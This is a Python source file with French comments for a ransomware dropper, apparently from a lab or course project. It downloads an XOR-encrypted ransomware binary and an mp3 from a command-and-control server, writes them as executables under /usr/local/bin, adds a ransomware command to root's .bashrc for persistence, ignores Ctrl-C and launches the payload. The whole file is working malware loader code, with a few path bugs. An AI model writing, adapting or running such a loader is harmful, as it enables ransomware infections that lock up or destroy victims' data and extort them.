import base64
import os
import requests
import subprocess
import sys
from xor_crypt import xor_crypt
import signal

CNC_ADDRESS = "cnc:6666"
OUTPUT_FILE = "/usr/local/bin/"


BASHRC_PATH = "/root/.bashrc"
COMMAND = "\n/usr/local/bin/ransomware --decrypt\n"

def get_ransomware_from_cnc():
    # Récupérer le ransomware crypté depuis le serveur CNC
    url = f"http://{CNC_ADDRESS}/ransomware"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print("Erreur lors de la récupération du ransomware")
        sys.exit(1)

def get_song_from_cnc():
    # Récupérer la musique mp3 depuis le serveur CNC
    url = f"http://{CNC_ADDRESS}/song"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        print("Erreur lors de la récupération de la musique")
        sys.exit(1)

def decode_and_save_data(encoded_data: str, encoded_key: str,path: str):
    # Décode le ransomware et la clé encodée en base64
    decoded_data = base64.b64decode(encoded_data)
    decoded_key = base64.b64decode(encoded_key)

    # Déchiffre le ransomware avec la clé décodée
    decrypted_data = xor_crypt(decoded_data, decoded_key)

    # Crée le dossier s'il n'existe pas
    os.makedirs(os.path.dirname('usr/local/bin'), exist_ok=True)
    # Sauvegarde le ransomware décodé dans un fichier
    with open(path, "wb") as f:
        f.write(decrypted_data)

    os.chmod(path, 0o755)  # Rendre le fichier exécutable

def main():
    # Ignorer les signaux SIGINT
    signal.signal(signal.SIGINT, signal.SIG_IGN)

    # Récupérer le ransomware depuis le CNC s'il n'est pas déjà présent
    if not os.path.exists(OUTPUT_FILE+"ransomware"):
        cnc_response = get_ransomware_from_cnc()
        encoded_ransomware = cnc_response["data"]
        encoded_key = cnc_response["key"]
        decode_and_save_data(encoded_ransomware, encoded_key, OUTPUT_FILE+"ransomware")
        print("Ransomware téléchargé et décodé")

    # Récupérer la musique depuis le CNC s'il n'est pas déjà présent
    if not os.path.exists("usr/local/bin/song.mp3"):
        cnc_response = get_song_from_cnc()
        encoded_song = cnc_response["data"]
        encoded_key = cnc_response["key"]
        decode_and_save_data(encoded_song, encoded_key, "usr/local/bin/song.mp3")
        print("Musique téléchargée et décodée")

    # Ajouter une commande au fichier .bashrc si permission suffisante
    try:
        with open(BASHRC_PATH, "a") as bashrc_file:
            bashrc_file.write(COMMAND)
    except PermissionError:
        print("Permission denied. Impossible d'ajouter la commande au fichier .bashrc")

    if len(sys.argv) != 2:
        # Lancer le ransomware installé
        subprocess.run(OUTPUT_FILE + "ransomware")
    else:
        # Lancer le ransomware installé avec des arguments
        subprocess.run([OUTPUT_FILE, sys.argv[1]])

if __name__ == "__main__":
    main()
